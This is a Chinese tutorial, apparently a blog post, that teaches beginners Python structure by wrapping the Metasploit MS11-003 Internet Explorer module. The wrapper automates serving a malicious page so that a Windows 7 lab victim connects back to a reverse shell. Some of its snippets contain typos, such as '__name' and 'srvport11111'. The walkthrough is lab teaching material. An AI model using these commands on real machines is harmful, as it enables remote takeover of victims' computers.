## 0x00 前言

一般高手们编写的定制化脚本、工具分三个版本如下

#### 1、源代码版本

不断更新的源代码版本，这个就不多说了，最初的样貌，未编译。

#### 2、debug版本

添加了不少注解性代码以及debug模块甚至作者未完成的模块，体积较大未编译。

#### 3、release发行版本

这个比较常见，主要是做了代码编译、代码优化、体积较小，运行速度快。最常见的优化手法有减少不必要的变量、注释；更改变量的数据类型(int——>int8)、编译优化等，如go语言使用`go build -ldflags "-w -s"`进行编译就会比`go build`编译出来的可执行文件小大约30%。

我们基本上可以在github上看到`release`发行版的字样。不过这里的发行版比较随意，有没有做代码优化完全看作者心情！

![](../Images/ef64e2d9413b9df60e14d6bd211335f0.png)

当然了，这篇文章，不在发行，如果刚刚上手，还没有到千万行代码的程度，我们可以不去考虑这些优化问题。但是我们需要重点考虑的是代码逻辑问题。

可能很多小伙伴一提到用python来编写exp很难啊，很厉害啥的，如果你是从语法和变量开始学起的python，那肯定觉着难。

个人认为，不做python开发的情况下，从需求向下兼容学习。说白了，从功能点开始写起。下面我们来编写一个很简单的代码，来迅速上手。

## 0x01 大体组成

由于是简单的脚本，这里不使用面向对象编程，而只是使用函数进行编程。

大致上一个python的exp，例如CVE的各类exp，基本上都是这样子的模板结构：

![](../Images/bf69b4f6dd0b4446c7d815bbfba65e58.png)

#### 1、引入模块

python里面有很多帮助我们封装好了的功能模块，这些模块里面有很多帮我处理某些东西的功能，我们要达到某种目的，就要调用这些模块。

这些模块其实也就是python文件，支持我们自己写一个python文件从而引用。

#### 2、多个函数

`def`就是`python`定义函数的关键字，而函数就是一个黑盒加工厂，也被称为方法(function)。上面输入数据，比如我们传入的变量常量；中间就是将我们传入的一切进行某些特定的处理，为函数体；下面的一个口就是处理后的结果，也就是输出，术语叫做返回值。那么多个函数就是处理多个东西咯。

![](../Images/f8aaab789ccbe7e9947fdab6deca100f.png)

声明函数用def，使用函数就是函数名加一个括号就行，如`a()`，就是使用`a`函数。

#### 3、主函数

对于python来讲，没有严格的主函数定义，但是在其他的语言类似于C语言，go语言，`main`函数是一个很严格入口函数，也就是只要有`main`函数，那么规定一切程序都要从`main`这里开始运行。多数渗透测试的`exp`或者`poc`编写者都会约定俗成写一个`main`，用来规范自己的代码易于阅读理解。

#### 4、规范化

`__name__ == '__main__'`是什么玩意儿？

定义一个文件为`a.py`如下：

*   
*   
*   

```
 print(1) if __name == '__main__':  print(2)
```

当我们直接`python3 a.py`时，`if __name__ == '__main__'`下面的代码**会**被运行。

![](../Images/6f7ea555e647f15f3c7dfd8aadb8931b.png)

之前在引入模块的时候提到，我们可以自己编写一个`python`文件，然后用别的`python`文件来引入。那如果`a.py`被当做模块被其他`python`文件引入时，`if __name__ == '__main__'`下面的代码就不会被运行。

所以一般来讲对于exp我们使用`python3 a.py`直接运行多一些，所以一般主函数和规范化的这个`if`语句放在一起写，即

*   
*   

```
 if __name == '__main__':  main()
```

也就变成了所谓的代码入口点了。

## 0x02 ms11-003快速复现

我们来快速复现一个漏洞——`ms11-003(windows7IE溢出攻击)`请自行搭建一个windows7的机器。然后kali和它能ping通就行了。

使用kali打开msf并选择`ms11-003`攻击模块，并如下设置：

*   
*   
*   
*   
*   
*   

```
 use exploit/windows/browser/ms11_003_ie_css_import set srvport 11111 set uripath hack.html set LPORT 4444 set LHOST 192.168.111.7 #kali ip exploit
```

这个漏洞是什么意思呢，就是windows7的IE浏览器有个巨大漏洞。我们先不去琢磨原理，总之msf能帮我们生成一个带有恶意代码的html文件，并且放在刚才我们设置的`srvport 11111`下了

![](../Images/e029646409a4169bbe9a2a639d3d808e.png)

当受害者使用windows7的IE浏览器访问这个`http://192.168.111.7:11111/hack.html`文件的时候，就会被上线，回连刚才设置的`4444`端口。

## 0x03 自动化编写

好了，明白了漏洞如何利用，我们尝试编写一下，目的是：省得以后自己手敲那么多msf命令，遇到了直接运行python即可。

那么拿出刚才的模板，4大块中，我们设计一下代码逻辑：引入模块，定义函数自动编写msf语句；主函数运行结束。

#### 1、模块引入

`os`就是操作系统(operation system)的意思，这个模块封装了很多的功能，也可以说封装了很多函数、方法。用来做什么？用来执行系统的命令。

比如`os`的`system`函数，可以直接调用系统的命令进行执行。  

*   
*   
*   

```
import os os.system('whoami')

```

![](../Images/23fe7035fbeb20ce9bb5a0e7ca8ff0ee.png)

其次要知道，运行msf，不但可以直接使用`msfconsole`，还**可以直接msfconsole加载一个rc文件，如msfconsole -r msf.rc** 

用python打开一个文件的方法有很多，推荐使用`with open`。

*   
*   
*   

```
 with open('1.txt','w') as file:  file.write('要写入的内容') file.close()
```

上面的代码意思就是，以`w`(write)写入的方式打开一个`1.txt`，生成一个文件句柄（对象）叫做`file`，当然这个`file`名字自定义的。这个`file`对象中有很多方法，比如写入方法(write)，调用这个写入方法就是`file.write()`。以`with open`的方式开启一个文件，其实不用再使用`close`方法关闭了，但是为了严格谨慎，最好还是写上`file.close()`。注意这里的`w`就是追加并且覆盖写入。

![](../Images/31e45f9a57ea70f0e9865aa265c119b4.png)

同样的思想，打开一个`msf.rc`文件，写入`msf`语句，这些语句就是之前我们输入的那些语句。然后`os.system`执行即可。

*   
*   
*   
*   
*   
*   
*   
*   
*   

```
 with open('msf.rc','w') as file:     file.write('use exploit/windows/browser/ms11_003_ie_css_import\n')     file.write('set srvport11111\n')     file.write('set uripath hack.html\n')     file.write('set LPORT 4444\n')     file.write('set LHOST 192.168.111.7\n')     file.write('run\n')     file.close() os.system('msfconsole -r msf.rc')
```

但是这里可能又觉着不对劲了，我的kali ip和端口这不就写死了么？

所以这里我们用变量来代替变化的数值，如下，这里的`str`是python的内置函数，意思就是将数据转换成字符型。因为数据拼接的时候比如是同类型，不能前面是字符型，变量是个整型，所以必须要强制转换一下。

*   
*   
*   
*   
*   
*   
*   
*   
*   

```
 with open('msf.rc','w') as file:     file.write('use exploit/windows/browser/ms11_003_ie_css_import\n')     file.write('set srvport '+str(rport)+'\n')     file.write('set uripath '+str(path)+'\n')     file.write('set LPORT '+str(lport)+'\n')     file.write('set LHOST '+str(lhost)+'\n')     file.write('run\n')     file.close() os.system('msfconsole -r msf.rc')
```

特别要注意的是，这里要加上空格，如果不加，就会变成`set srvport1111`这样了

#### 3、参数定义——argparse模块讲解

上面我们用变量定义了一些我们希望自定义的数据。可以看到它们都是有着黄色波浪线的，说明它们并没有被定义。

如何定义？利用`argparse`模块，这里我给出一个模板，其实很简单：

*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   

```
 import argparse parser = argparse.ArgumentParser(description='fishing here') parser.add_argument('-l',required=True,help='listen host',dest='lhost') parser.add_argument('-p',required=True,help='exploit listening port',dest='lport') parser.add_argument('-t',required=True,help='redirect to this hackingfile',dest='path') parser.add_argument('-r',required=True,help='redirecting listen port',dest='rport') args = parser.parse_args() print(args) rport = args.rport lport = args.lport path = args.path lhost = args.lhost
```

第一行代码，生成了一个空白参数集；右边的`argparse.ArgumentParser`为固定写法，是`argparse`模块的一个方法；里面的`description`就是描述这个空白参数集是什么意思的；

2-5行代码，就是给这个空白参数集添加一些参数；其中`-l`就是用谁指定，`required=True`就是必须要有这个参数，如果用户不输入会报错；`help`就是帮助信息，具体的值可以自定义，`dest`就是创建一个参数，或者指向某一个参数。

第6行代码，参数实例化，理解不了就固定记忆，固定写法；

第8-11行，就是之前我们定义的变量，与这个参数集的各个参数一一对应起来。一般将这个模板，放在`if __name == '__main__':`如下图。
